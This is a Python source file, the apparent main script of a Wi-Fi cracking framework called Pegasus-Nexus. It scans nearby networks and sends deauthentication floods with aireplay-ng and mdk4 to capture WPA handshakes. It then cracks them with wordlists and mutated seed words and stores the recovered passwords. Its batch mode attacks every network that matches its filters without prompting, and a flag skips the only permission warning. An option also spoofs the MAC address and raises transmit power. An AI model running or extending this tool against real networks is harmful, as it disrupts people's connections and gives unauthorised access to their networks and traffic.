#!/usr/bin/env python3

import sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import signal
import atexit
import time
import re
import json
import argparse
import subprocess
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
from pathlib import Path
from typing import Any, Optional


def setup_logging(level=logging.INFO, log_file="pegasus_nexus.log",
                  max_bytes=10 * 1024 * 1024, backup_count=5):
    root_logger = logging.getLogger()
    root_logger.setLevel(level)

    formatter = logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(formatter)
    root_logger.addHandler(stream_handler)

    file_handler = RotatingFileHandler(
        log_file, maxBytes=max_bytes, backupCount=backup_count
    )
    file_handler.setFormatter(formatter)
    root_logger.addHandler(file_handler)

    return logging.getLogger("PegasusNexus")


log = setup_logging()

CRACKED_DB_PATH = os.path.expanduser("~/.pegasus_nexus/cracked.json")
SCAN_CACHE_DIR = os.path.expanduser("~/.pegasus_nexus/scans")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="pegasus-nexus",
        description="Pegasus-Nexus - automated wireless security auditing framework.",
    )
    p.add_argument("--interface", "-i", default="wlan0",
                    help="Wireless interface (default: wlan0)")
    p.add_argument("--output-dir", "-o", default=".",
                    help="Directory for reports (default: .)")
    p.add_argument("--verbose", "-v", action="store_true",
                    help="Enable debug logging")

    mode = p.add_argument_group("operation modes")
    mode.add_argument("--batch", "--auto", action="store_true",
                      help="Fully automated mode - no prompts")
    mode.add_argument("--list-only", action="store_true",
                      help="Scan and display networks only, no attack")
    mode.add_argument("--cap-status", action="store_true",
                      help="Show live cap interface status and exit")

    filt = p.add_argument_group("target filtering (batch mode)")
    filt.add_argument("--min-signal", type=int, default=-80,
                      help="Minimum signal in dBm (default: -80)")
    filt.add_argument("--max-targets", type=int, default=0,
                      help="Max targets to attack, 0 = unlimited")
    filt.add_argument("--encryption", choices=["WPA2", "WPA", "WEP", "OPEN"],
                      help="Only attack this encryption type")
    filt.add_argument("--channel", type=int,
                      help="Only attack networks on this channel")
    filt.add_argument("--wps-only", action="store_true",
                      help="Only attack WPS-unlocked networks")
    filt.add_argument("--seeds", nargs="*", default=None,
                      help="Seed keywords for mutation (batch mode)")

    wl = p.add_argument_group("wordlists")
    wl.add_argument("--download-wordlists", action="store_true",
                    help="Download wordlists (rockyou, common WPA)")
    wl.add_argument("--list-wordlists", action="store_true",
                    help="Show available wordlists and exit")
    wl.add_argument("--wordlist", "-w", type=str, default=None,
                    help="Path to a wordlist file to try first")

    adv = p.add_argument_group("advanced")
    adv.add_argument("--timeout", type=int, default=3600,
                     help="Per-target timeout in seconds (default: 3600)")
    adv.add_argument("--skip-confirm", action="store_true",
                     help="Skip attack confirmation prompt")
    adv.add_argument("--cache-scans", action="store_true",
                     help="Save scan results to JSON cache")
    adv.add_argument("--resume", type=str,
                     help="Resume from a cached scan file")
    adv.add_argument("--no-wps", action="store_true",
                     help="Skip WPS detection phase")
    adv.add_argument("--html-report", action="store_true",
                     help="Generate HTML report with visual statistics")
    adv.add_argument("--benchmark", action="store_true",
                     help="Benchmark cracking speed before attack")
    adv.add_argument("--hardware-optimize", action="store_true",
                     help="Optimize hardware: BO regdomain, TX power boost, MAC spoof, GPU detect")
    adv.add_argument("--no-gpu", action="store_true",
                     help="Disable GPU acceleration even if available")
    adv.add_argument("--deauth-count", type=int, default=20,
                     help="Deauth packets per burst (default: 20)")
    adv.add_argument("--handshake-timeout", type=int, default=180,
                     help="Handshake capture timeout (default: 180s)")
    return p


def _ensure_dir(path: str) -> None:
    Path(path).mkdir(parents=True, exist_ok=True)

def load_cracked_db() -> dict[str, str]:
    try:
        if os.path.isfile(CRACKED_DB_PATH):
            with open(CRACKED_DB_PATH) as f:
                return json.load(f)
    except (json.JSONDecodeError, OSError) as e:
        log.warning("Failed to load cracked DB: %s", e)
    return {}

def save_cracked_db(db: dict[str, str]) -> None:
    _ensure_dir(os.path.dirname(CRACKED_DB_PATH))
    try:
        with open(CRACKED_DB_PATH, "w") as f:
            json.dump(db, f, indent=2)
        log.info("Cracked database updated (%d entries)", len(db))
    except OSError as e:
        log.error("Failed to save cracked DB: %s", e)

def save_scan_cache(targets: list[dict], interface: str, path: str) -> None:
    _ensure_dir(os.path.dirname(path))
    try:
        payload = {
            "timestamp": datetime.now().isoformat(),
            "interface": interface,
            "target_count": len(targets),
            "targets": targets,
        }
        with open(path, "w") as f:
            json.dump(payload, f, indent=2, default=str)
    except Exception as e:
        log.error("Failed to save scan cache: %s", e)

def load_scan_cache(path: str) -> Optional[list[dict]]:
    try:
        with open(path) as f:
            payload = json.load(f)
        log.info("Loaded scan cache: %d targets from %s on %s",
                 payload.get("target_count", 0),
                 payload.get("timestamp", "?"),
                 payload.get("interface", "?"))
        return payload.get("targets", [])
    except Exception as e:
        log.error("Failed to load scan cache: %s", e)
        return None

def generate_report(targets: list[dict], results: list[dict],
                    args: argparse.Namespace, output_dir: str) -> Optional[str]:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"report_{ts}.json"
    path = os.path.join(output_dir, filename)
    successful = [r for r in results if r.get("success")]
    report = {
        "timestamp": datetime.now().isoformat(),
        "command_line": " ".join(sys.argv),
        "interface": args.interface,
        "mode": "batch" if args.batch else "interactive",
        "targets_total": len(targets),
        "targets_attacked": len(results),
        "targets_compromised": len(successful),
        "results": results,
    }
    _ensure_dir(output_dir)
    try:
        with open(path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"   Report saved: {path}")
        return path
    except Exception as e:
        log.error("Failed to write report: %s", e)
        return None


LEET_MAP = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "b": "8", "g": "9"}
YEARS = [str(y) for y in range(2020, 2028)]
COMMON_SUFFIXES = ["!", "@", "#", "123", "123!", "2024", "2025", "2026", "2027"]

def _leet(word: str) -> str:
    return "".join(LEET_MAP.get(c.lower(), c) for c in word)

def _cap_variants(word: str) -> list[str]:
    variants = [word]
    if word:
        variants += [word.capitalize(), word.upper(), word.lower()]
    return list(set(variants))

def mutate_seeds(seeds: list[str]) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for seed in seeds:
        clean = seed.strip()
        if not clean:
            continue
        for bv in _cap_variants(clean):
            if bv not in seen:
                seen.add(bv); out.append(bv)
            leeted = _leet(bv)
            if leeted not in seen:
                seen.add(leeted); out.append(leeted)
    for word in list(out):
        for suffix in COMMON_SUFFIXES:
            c = word + suffix
            if c not in seen:
                seen.add(c); out.append(c)
            c = suffix + word
            if c not in seen:
                seen.add(c); out.append(c)
    return out


class PersistentMonitor:
    def __init__(self, config: Any, error_handler: Any) -> None:
        self.config = config
        self.error_handler = error_handler
        self.monitor_manager: Any = None
        self.monitor_interface: Optional[str] = None
        self.original_interface: Optional[str] = None
        self._cleaning_up = False

    def initialize(self) -> bool:
        try:
            from intelligence.monitor_manager import MonitorModeManager
            self.monitor_manager = MonitorModeManager(self.config, self.error_handler)
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)
            atexit.register(self.cleanup)
            return True
        except ImportError as e:
            self.error_handler.handle_error("E004", "MonitorManager module not found", e)
            return False
        except Exception as e:
            self.error_handler.handle_error("E004", "Persistent monitor init failed", e)
            return False

    def start_persistent_monitor(self, interface: str = "wlan0") -> Optional[str]:
        if not interface or not isinstance(interface, str):
            log.error("Invalid interface name")
            return None
        self.original_interface = interface
        try:
            self.monitor_interface = self.monitor_manager.setup_monitor_mode(interface)
        except Exception as e:
            log.error("Failed to set up monitor mode: %s", e)
            return None
        if not self.monitor_interface:
            log.error("Failed to start persistent monitor mode")
            return None
        return self.monitor_interface

    def stop_persistent_monitor(self) -> bool:
        if not self.monitor_interface:
            return False
        try:
            success = self.monitor_manager.stop_monitor_mode(self.monitor_interface)
            if success:
                self.monitor_interface = None
                return True
        except Exception as e:
            log.error("Failed to stop monitor mode: %s", e)
        return False

    def _signal_handler(self, signum: int, frame: Any) -> None:
        self.cleanup()
        sys.exit(0)

    def cleanup(self) -> None:
        if self._cleaning_up:
            return
        self._cleaning_up = True
        self.stop_persistent_monitor()

    def get_monitor_interface(self) -> Optional[str]:
        return self.monitor_interface

    def is_monitor_active(self) -> bool:
        if not self.monitor_interface:
            return False
        try:
            if self.monitor_manager is None:
                return False
            info = self.monitor_manager.get_interface_info(self.monitor_interface)
            return info.get("mode") == "monitor"
        except Exception:
            return False

    def __del__(self) -> None:
        self.cleanup()


def format_cap_status(monitor_interface: str) -> None:
    print(f"format cap {monitor_interface}")
    try:
        r = subprocess.run(["iwconfig", monitor_interface],
                           capture_output=True, text=True, timeout=5)
        out = r.stdout + r.stderr
        for line in out.splitlines():
            stripped = line.strip()
            if stripped:
                print(f"   {stripped}")
    except Exception as e:
        print(f"   Failed to get interface info: {e}")

    try:
        r = subprocess.run(
            ["sudo", "airodump-ng", monitor_interface, "--write", "/tmp/pegasus_status",
             "--output-format", "csv", "--band", "abg"],
            capture_output=True, text=True, timeout=8
        )
    except Exception:
        pass

    csv_path = "/tmp/pegasus_status-01.csv"
    if os.path.exists(csv_path):
        total = 0
        with open(csv_path) as f:
            for line in f:
                if "WPA" in line or "WEP" in line or "OPN" in line:
                    total += 1
        print(f"\n   Networks visible: {total}")
        try:
            os.remove(csv_path)
        except OSError:
            pass


def send_deauth_packets(target_bssid: str, interface: str,
                        count: int = 20) -> bool:
    print("   Sending deauthentication packets...")

    strategies = [
        ["sudo", "aireplay-ng", "--deauth", str(count), "-a", target_bssid, interface],
        ["sudo", "aireplay-ng", "--deauth", str(count), "-a", target_bssid,
         "--ignore-negative-one", interface],
        ["sudo", "aireplay-ng", "--deauth", "5", "-a", target_bssid,
         "-c", "FF:FF:FF:FF:FF:FF", interface],
    ]

    try:
        r = subprocess.run(["which", "mdk4"], capture_output=True, text=True, timeout=3)
        if r.returncode == 0:
            strategies.append(["sudo", "mdk4", interface, "d", "-b", target_bssid])
            print("   MDK4 available - will try as fallback")
    except Exception:
        pass

    success_count = 0
    for cmd in strategies:
        try:
            print(f"   Trying: {' '.join(cmd)}")
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if proc.returncode == 0:
                print("   Deauthentication packets sent successfully")
                success_count += 1
            else:
                err = proc.stderr.strip() if proc.stderr else "(no error output)"
                print(f"   Deauth failed: {err}")
        except subprocess.TimeoutExpired:
            print("   Deauth command timeout (may have worked)")
            success_count += 1
        except Exception as e:
            print(f"   Deauth error: {e}")

    return success_count > 0


def monitor_handshake(cap_file: str, timeout: int = 180) -> Optional[str]:
    print("   Monitoring for handshake...")
    start = time.time()
    last_size = 0
    stable_cycles = 0

    while time.time() - start < timeout:
        elapsed = int(time.time() - start)
        remaining = timeout - elapsed

        if os.path.exists(cap_file):
            size = os.path.getsize(cap_file)

            if size > last_size:
                stable_cycles = 0
                print(f"   Capture file growing: {size} bytes")
            else:
                stable_cycles += 1

            if size > 5000:
                r = subprocess.run(["aircrack-ng", cap_file],
                                   capture_output=True, text=True, timeout=10)
                if "WPA (1 handshake)" in r.stdout:
                    print("   Valid handshake detected in capture file!")
                    return cap_file
                elif "WPA (0 handshake)" in r.stdout and stable_cycles > 6:
                    print("   Capture file exists but contains 0 handshakes")

            print(f"   Growing - {elapsed}/{timeout}s ({remaining}s remaining)")
            last_size = size
        else:
            print(f"   Waiting for capture file... {elapsed}/{timeout}s ({remaining}s remaining)")

        time.sleep(5)

    print("   Handshake not captured within timeout")
    return None


def _safe_input(prompt: str = "") -> str:
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print("")
        return "exit"

def _signal_bar(dbm: int) -> str:
    if dbm >= -50: return "++++"
    if dbm >= -60: return "+++."
    if dbm >= -70: return "++.."
    if dbm >= -80: return "+..."
    return "...."

def _parse_seeds(seeds_input: str) -> list[str]:
    if not seeds_input:
        return []
    return [s.strip() for s in re.split(r"[,\s;]+", seeds_input) if s.strip()]

def _countdown(seconds: int, msg: str = "Next scan") -> bool:
    start = time.time()
    for i in range(seconds, 0, -1):
        elapsed = int(time.time() - start)
        print(f"   {msg} in {i}s... ({elapsed}s elapsed, Ctrl+C to stop)", end="\r")
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n   Interrupted")
            return False
    print("")
    return True

def _display_targets_table(targets: list[dict]) -> None:
    if not targets:
        print("No targets to display.")
        return
    print(f"\nFOUND {len(targets)} NETWORKS:")
    print("=" * 100)
    print(f"{'#':<3} {'SSID':<24} {'BSSID':<18} {'Ch':<4} "
          f"{'Enc':<8} {'Signal':<16} {'Pct':<7} {'WPS':<5} {'Clients'}")
    print("-" * 100)
    for i, t in enumerate(targets, 1):
        ssid = (t.get("ssid", "") or "")[:23] or "<hidden>"
        bssid = t.get("bssid", "XX:XX:XX:XX:XX:XX")
        ch = t.get("channel", t.get("Channel", "?"))
        enc = t.get("encryption", "?")[:8]
        sig = t.get("signal_strength", t.get("Power", -100))
        pct = t.get("success_probability", 0.0)
        wps = {"unlocked": "OK", "locked": "NO"}.get(t.get("wps_status", ""), "??")
        cl = t.get("client_count", t.get("clients", t.get("Clients", "?")))
        print(f"{i:<3} {ssid:<24} {bssid:<18} {ch:<4} "
              f"{enc:<8} {_signal_bar(sig)} {sig:<3} dBm  {pct*100:<5.1f}% {wps:<5} {cl}")
    print("=" * 100)


def _select_targets_interactive(targets: list[dict]) -> Any:
    if not targets:
        return []
    _display_targets_table(targets)
    while True:
        print("\nSELECT TARGETS TO ATTACK:")
        print("   numbers  - e.g., 1, 3, 5")
        print("   'all'    - all targets")
        print("   'top3'   - top 3 by success probability")
        print("   'strong' - signal > -70 dBm")
        print("   'wps'    - WPS-unlocked only")
        print("   'rescan' - scan again")
        print("   'exit'   - stop and cleanup")
        choice = _safe_input("Choice: ").lower()
        if choice == "exit":
            return "exit"
        if choice == "rescan":
            return "rescan"
        if choice == "all":
            return list(targets)
        if choice == "top3":
            return sorted(targets, key=lambda x: x.get("success_probability", 0), reverse=True)[:3]
        if choice == "strong":
            sel = [t for t in targets if t.get("signal_strength", -100) > -70]
            if sel:
                return sel
            print("   No strong-signal targets")
            continue
        if choice == "wps":
            sel = [t for t in targets if t.get("wps_status") == "unlocked"]
            if sel:
                return sel
            print("   No WPS-unlocked targets")
            continue
        if not choice:
            continue
        indices = []
        for part in choice.split(","):
            part = part.strip()
            if part.isdigit():
                idx = int(part) - 1
                if 0 <= idx < len(targets):
                    indices.append(idx)
        if indices:
            return [targets[i] for i in indices]
        print("   Invalid selection.")

def _auto_select_targets(targets: list[dict], min_signal: int = -80,
                          max_targets: int = 0,
                          encryption_filter: Optional[str] = None,
                          channel_filter: Optional[int] = None,
                          wps_only: bool = False) -> list[dict]:
    f = list(targets)
    if wps_only:
        f = [t for t in f if t.get("wps_status") == "unlocked"]
        print(f"   WPS filter: {len(f)} remain")
    if encryption_filter:
        f = [t for t in f if t.get("encryption", "").upper() == encryption_filter.upper()]
        print(f"   Encryption filter ({encryption_filter}): {len(f)} remain")
    if channel_filter is not None:
        f = [t for t in f if int(t.get("channel", t.get("Channel", 0))) == channel_filter]
        print(f"   Channel filter ({channel_filter}): {len(f)} remain")
    f = [t for t in f if t.get("signal_strength", -100) >= min_signal]
    print(f"   Signal filter (>= {min_signal} dBm): {len(f)} remain")
    f.sort(key=lambda x: x.get("success_probability", 0), reverse=True)
    if max_targets > 0:
        f = f[:max_targets]
    if f:
        print(f"   Auto-selected {len(f)} target(s)")
        for i, t in enumerate(f, 1):
            s = t.get("ssid", "?") or "?"
            p = t.get("success_probability", 0) * 100
            sig = t.get("signal_strength", -100)
            print(f"      {i}. {s[:30]} - {p:.1f}% - {sig} dBm")
    return f


def _get_attack_confirmation(targets: list[dict]) -> bool:
    if not targets:
        return False
    print(f"\nREADY TO ATTACK {len(targets)} TARGET(S):")
    for i, t in enumerate(targets, 1):
        s = t.get("ssid", "<unknown>") or "<unknown>"
        sig = t.get("signal_strength", -100)
        pct = t.get("success_probability", 0.0)
        print(f"   {i}. {s} - {pct*100:.1f}% - {sig} dBm")
    print("\nWARNING: This will perform REAL attacks on networks!")
    print("   Make sure you have permission.")
    while True:
        c = _safe_input("Start attacks? (yes/no): ").lower()
        if c in ("y", "yes"):
            return True
        if c in ("n", "no", ""):
            return False


def perform_intelligence_scan(intel_controller: Any, monitor_interface: str,
                               skip_wps: bool = False) -> list[dict]:
    print(f"Scanning networks on {monitor_interface}...")
    try:
        scanner = getattr(intel_controller, "scanner", None)
        if scanner is None or not hasattr(scanner, "perform_network_scan"):
            print("   Scanner not available")
            return []
        networks = scanner.perform_network_scan(monitor_interface)
        if not networks:
            print("   No networks found")
            return []
        print(f"   Found {len(networks)} raw network(s)")
        analyzer = getattr(intel_controller, "analyzer", None)
        if analyzer is None or not hasattr(analyzer, "analyze_networks"):
            print("   Analyzer not available")
            return []
        analyzed = analyzer.analyze_networks(networks)
        print(f"   Analyzed {len(analyzed)} target(s)")

        if not skip_wps:
            wps = getattr(intel_controller, "wps_detector", None)
            if wps is not None and hasattr(wps, "bulk_detect_wps"):
                print("   Checking WPS status...")
                final = wps.bulk_detect_wps(analyzed, monitor_interface)
            else:
                final = analyzed
        else:
            final = analyzed

        if analyzer is not None and hasattr(analyzer, "display_target_summary"):
            analyzer.display_target_summary(final)

        return final
    except Exception as e:
        print(f"   Scan failed: {e}")
        return []


def perform_aggregated_scan(intel_controller: Any, monitor_interface: str,
                              passes: int = 2, skip_wps: bool = False) -> list[dict]:
    all_scans: list[list[dict]] = []
    for p in range(passes):
        print(f"\n   Scan pass {p+1}/{passes}")
        result = perform_intelligence_scan(intel_controller, monitor_interface, skip_wps)
        if result:
            all_scans.append(result)
        if p < passes - 1:
            time.sleep(3)
    if not all_scans:
        return []
    if len(all_scans) == 1:
        return all_scans[0]
    by_bssid: dict[str, list[dict]] = {}
    for scan in all_scans:
        for t in scan:
            b = t.get("bssid")
            if b:
                by_bssid.setdefault(b, []).append(t)
    merged = []
    for bssid, entries in by_bssid.items():
        base = dict(entries[0])
        sigs = [e.get("signal_strength", -100) for e in entries]
        probs = [e.get("success_probability", 0.0) for e in entries]
        base["signal_strength"] = round(sum(sigs) / len(sigs))
        base["success_probability"] = sum(probs) / len(probs)
        base["scan_count"] = len(entries)
        merged.append(base)
    merged.sort(key=lambda x: x.get("success_probability", 0), reverse=True)
    print(f"\n   Aggregated {len(all_scans)} scans into {len(merged)} unique targets")
    return merged


def setup_runtime_logging(args):
    level = logging.DEBUG if args.verbose else logging.INFO
    log_file = os.environ.get("PEGASUS_LOG_FILE", "pegasus_nexus.log")
    max_mb = int(os.environ.get("PEGASUS_LOG_MAX_MB", "10"))
    backups = int(os.environ.get("PEGASUS_LOG_BACKUPS", "5"))

    for h in logging.getLogger().handlers[:]:
        logging.getLogger().removeHandler(h)

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(fmt)
    logging.getLogger().addHandler(sh)

    fh = RotatingFileHandler(
        log_file, maxBytes=max_mb * 1024 * 1024, backupCount=backups
    )
    fh.setFormatter(fmt)
    logging.getLogger().addHandler(fh)

    logging.getLogger().setLevel(level)


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    setup_runtime_logging(args)

    print(f"Pegasus-Nexus v1.0 ({'batch' if args.batch else 'interactive'} mode)")
    print("=" * 55)

    if args.cap_status:
        from core.bootstrap import SystemBootstrap
        bootstrap = SystemBootstrap()
        bootstrap.initialize_system()
        pm = PersistentMonitor(bootstrap.config_manager, bootstrap.error_handler)
        pm.initialize()
        mon = pm.start_persistent_monitor(args.interface)
        if mon:
            time.sleep(3)
            format_cap_status(mon)
            pm.cleanup()
        return 0

    _ensure_dir(os.path.dirname(CRACKED_DB_PATH))

    # ---- Wordlist management ----
    if args.list_wordlists:
        from tools.wordlist_manager import WordlistManager
        mgr = WordlistManager()
        available = mgr.list_available()
        if available:
            print("Available wordlists:")
            for wl in available:
                print(f"   {wl['name']}: {wl['size_mb']} MB  ({wl['path']})")
        else:
            print("No wordlists downloaded. Use --download-wordlists to fetch.")
        return 0

    if args.download_wordlists:
        from tools.wordlist_manager import WordlistManager
        mgr = WordlistManager()
        results = mgr.download_all()
        for name, res in results.items():
            if "error" in res:
                print(f"   {name}: FAILED - {res['error']}")
            else:
                print(f"   {name}: {res['status']} ({res.get('size_mb', '?')} MB)")
        mgr.build_vendor_wordlist()
        return 0

    # ---- Hardware Optimization & GPU detection ----
    hardware_optimizer_instance = None
    gpu_info = None
    if args.hardware_optimize:
        print("\nHardware optimization...")
        from engines.hardware_optimizer import HardwareOptimizer
        hardware_optimizer_instance = HardwareOptimizer(error_handler=None)
        gpu_info = hardware_optimizer_instance.apply_all(args.interface)
        print()

    if gpu_info is None:
        from engines.hardware_optimizer import HardwareOptimizer
        hardware_optimizer_instance = HardwareOptimizer(error_handler=None)
        gpu_info = hardware_optimizer_instance.detect_gpu()
        if gpu_info["available"] and not args.no_gpu:
            print(f"   GPU acceleration available: {gpu_info['backends']}")

    # ---- Benchmark ----
    benchmark_result = None
    if args.benchmark:
        from learning.model_persistence import Benchmark
        bm = Benchmark()
        benchmark_result = bm.run()
        speed = benchmark_result.get("aircrack", {}).get("passwords_per_second", 0)
        print(f"   Aircrack speed: {speed:,.0f} p/s (CPU)")
        if gpu_info and gpu_info.get("available") and not args.no_gpu:
            gh_speed = benchmark_result.get("hashcat", {}).get("passwords_per_second", 0)
            if gh_speed:
                print(f"   Hashcat speed:  {gh_speed:,.0f} p/s (GPU)")
            else:
                print(f"   Hashcat: available (GPU detected)")
        if args.list_only:
            return 0

    try:
        from core.bootstrap import SystemBootstrap
        from orchestration.main_controller import IntelligenceController
        from orchestration.real_attack_controller import RealAttackController
    except ImportError as e:
        log.error("Import failed: %s", e)
        return 1

    bootstrap = SystemBootstrap()
    if not bootstrap.initialize_system():
        print("System initialization failed!")
        return 1

    pm = PersistentMonitor(bootstrap.config_manager, bootstrap.error_handler)
    if not pm.initialize():
        print("Persistent monitor init failed!")
        return 1

    monitor_iface = pm.start_persistent_monitor(args.interface)
    if not monitor_iface:
        print("Failed to start monitor mode!")
        return 1

    intel_ctrl = IntelligenceController(bootstrap.config_manager, bootstrap.error_handler)
    atk_ctrl = RealAttackController(bootstrap.config_manager, bootstrap.error_handler,
                                    hardware_optimizer=hardware_optimizer_instance)

    if not intel_ctrl.initialize_intelligence_system():
        print("Intelligence system init failed!")
        pm.cleanup()
        return 1

    if not atk_ctrl.initialize_attack_system(hardware_optimizer=hardware_optimizer_instance):
        print("Attack system init failed!")
        pm.cleanup()
        return 1

    # ---- Persistent Health & Brain ----
    brain = atk_ctrl.real_attack_engine.brain
    health = atk_ctrl.real_attack_engine.health_guardian
    scheduler = atk_ctrl.real_attack_engine.scheduler

    if hasattr(health, 'health_report'):
        health_report = health.health_report()
        if not health_report.get("can_proceed", True):
            critical_missing = health.get_critical_missing()
            if critical_missing:
                print("\n   Critical tools missing. Attempting auto-install...")
                result = health.auto_install_all_missing()
                print(f"   Installed: {result['installed']}, Failed: {result['failed']}")
                if result["failed"] > 0:
                    print("   Some critical tools could not be installed. Proceeding anyway.")

    if hasattr(brain, 'summarize'):
        brain.summarize()

    targets: list[dict] = []
    if args.resume:
        cached = load_scan_cache(args.resume)
        if cached is None:
            pm.cleanup()
            return 1
        targets = cached
        print(f"Resumed {len(targets)} targets from cache")
        if not args.batch:
            _display_targets_table(targets)

    cracked_db = load_cracked_db()
    if cracked_db:
        log.info("Loaded %d previously cracked networks", len(cracked_db))

    scan_count = 0
    consecutive_empty = 0
    all_results: list[dict] = []

    try:
        while True:
            if not args.resume or targets:
                scan_count += 1
                print(f"\nSCAN CYCLE #{scan_count}")
                print("-" * 55)

                session_start = time.time()

                targets = perform_aggregated_scan(
                    intel_ctrl, monitor_iface, passes=2, skip_wps=args.no_wps
                )

                if not targets:
                    consecutive_empty += 1
                    if consecutive_empty >= 5:
                        print("No networks found after multiple attempts. Exiting.")
                        break
                    if not _countdown(30, "Rescanning"):
                        break
                    continue

                consecutive_empty = 0
                args.resume = None

                session_elapsed = time.time() - session_start
                if session_elapsed > 1:
                    print(f"   Scan completed in {session_elapsed:.1f}s")

            if args.cache_scans:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_scan_cache(targets, monitor_iface,
                                os.path.join(SCAN_CACHE_DIR, f"scan_{ts}.json"))

            if args.list_only:
                _display_targets_table(targets)
                break

            before = len(targets)
            targets = [t for t in targets if t.get("bssid") not in cracked_db]
            skipped = before - len(targets)
            if skipped:
                print(f"   Skipped {skipped} already-cracked network(s)")
            if not targets:
                print("No uncracked targets remaining. Exiting.")
                break

            if args.batch:
                selected = _auto_select_targets(
                    targets, min_signal=args.min_signal,
                    max_targets=args.max_targets,
                    encryption_filter=args.encryption,
                    channel_filter=args.channel,
                    wps_only=args.wps_only,
                )
                if not selected:
                    print("No targets matched filters. Exiting.")
                    break
            else:
                selected = _select_targets_interactive(targets)
                if selected == "exit":
                    break
                if selected == "rescan":
                    continue
                if not selected:
                    continue
                if not args.skip_confirm and not _get_attack_confirmation(selected):
                    continue

            user_seeds: list[str] = []
            if args.batch and args.seeds:
                user_seeds = list(args.seeds)
                print(f"   CLI seeds: {', '.join(user_seeds)}")
            elif not args.batch:
                si = _safe_input("\nSuggestions (seeds, comma-separated, or Enter to skip): ")
                user_seeds = _parse_seeds(si)

            mutated: list[str] = []
            if user_seeds:
                print(f"\nGenerating mutations for {len(user_seeds)} seed word(s)...")
                mutated = mutate_seeds(user_seeds)
                print(f"   {len(user_seeds)} seed(s) expanded to {len(mutated)} candidate(s)")

            print(f"\nStarting attacks on {len(selected)} target(s) via {monitor_iface}...")
            if args.wordlist:
                if os.path.isfile(args.wordlist):
                    print(f"   Custom wordlist: {args.wordlist}")
                else:
                    print(f"   WARNING: wordlist not found: {args.wordlist}")

            attack_start = time.time()

            try:
                attack_results = atk_ctrl.execute_real_attack_cycle(
                    selected, monitor_iface,
                    seeds=mutated if mutated else None,
                    wordlist=args.wordlist,
                )
            except AttributeError as e:
                print(f"   Attack controller error: {e}")
                continue
            except Exception as e:
                print(f"   Attack failed: {e}")
                continue

            attack_elapsed = time.time() - attack_start
            all_results.extend(attack_results)

            successful = [r for r in attack_results if r.get("success")]

            if successful:
                print(f"\nSUCCESS! Compromised {len(successful)} network(s) in {attack_elapsed:.1f}s")
                for r in successful:
                    tgt = r.get("target", {})
                    ssid = tgt.get("ssid", "?")
                    bssid = tgt.get("bssid", "")
                    pw = r.get("password", "?")
                    print(f"   CRACKED: {ssid} ({bssid}) -> {pw}")
                    cracked_db[bssid] = pw
                save_cracked_db(cracked_db)

                if args.batch:
                    continue
                if _safe_input("Continue attacking? (yes/no): ").lower() not in ("y", "yes"):
                    break
            else:
                print(f"\nNo networks compromised in {attack_elapsed:.1f}s. Continuing...")

    except KeyboardInterrupt:
        print("\nUser requested stop")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        import traceback
        traceback.print_exc()
        if not args.batch:
            if _safe_input("Continue despite error? (yes/no): ").lower() not in ("y", "yes"):
                pass

    print("\nFINAL CLEANUP - Stopping monitor mode...")
    pm.cleanup()

    if all_results:
        generate_report(targets, all_results, args, args.output_dir)

    if all_results and args.html_report:
        try:
            from tools.report_generator import generate_html_report
            cracked_db = load_cracked_db()
            generate_html_report(
                targets, all_results, args, args.output_dir,
                cracked_db=cracked_db, benchmark=benchmark_result,
            )
        except Exception as e:
            log.warning("HTML report generation failed: %s", e)

    if benchmark_result:
        speed = benchmark_result.get("aircrack", {}).get("passwords_per_second", 0)
        print(f"   Final stats: tested {sum(r.get('tested_count', 0) for r in all_results):,} passwords")
        print(f"   Benchmark speed: {speed:,.0f} p/s")

    print("Pegasus-Nexus shutdown complete!")
    return 0


if __name__ == "__main__":
    sys.exit(main())
